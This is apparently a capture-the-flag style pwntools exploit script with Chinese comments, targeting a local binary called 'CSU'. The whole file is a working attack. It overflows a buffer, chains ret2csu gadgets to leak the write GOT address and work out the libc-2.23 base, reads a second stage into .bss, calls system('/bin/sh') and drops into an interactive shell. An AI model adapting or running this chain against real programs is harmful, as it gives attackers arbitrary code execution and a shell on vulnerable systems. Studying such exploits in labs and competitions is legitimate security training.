from pwn import *

s = process("./CSU")
elf = ELF("./CSU")
context(log_level='debug', arch='amd64', os='linux')


def csu(rdi, rsi, rdx, func):
    payload = flat('A' * 8, 0, 1, func, rdi, rsi, rdx)
    return payload


csu_start = 0x400606
csu_exec = 0x4005F0

# gdb.attach(s, "b *0x400563\nc")
payload = flat('A' * 0x60, 0, csu_start, csu(1, elf.got['write'], 8, elf.got['write']), csu_exec)  # 直接填好下一次ret2rsu的寄存器，让payload变得短一点
payload += csu(0, elf.bss(0x500), 0x100, elf.got['read']) + p64(csu_exec) # 就是说前面的  csu(0, elf.bss(0x500), 0x100, elf.got['read']) 是下一个 csu_exec的参数
payload += csu(elf.bss(0x500) + 8, 0, 0, elf.bss(0x500)) + p64(csu_exec)
s.send(payload)

libc = ELF("./libc-2.23.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + b"\x00\x00") - libc.sym['write']
success(hex(libc.address))

# raw_input(">")
payload = p64(libc.sym['system']) + b"/bin/sh\x00"
s.send(payload)

s.interactive()
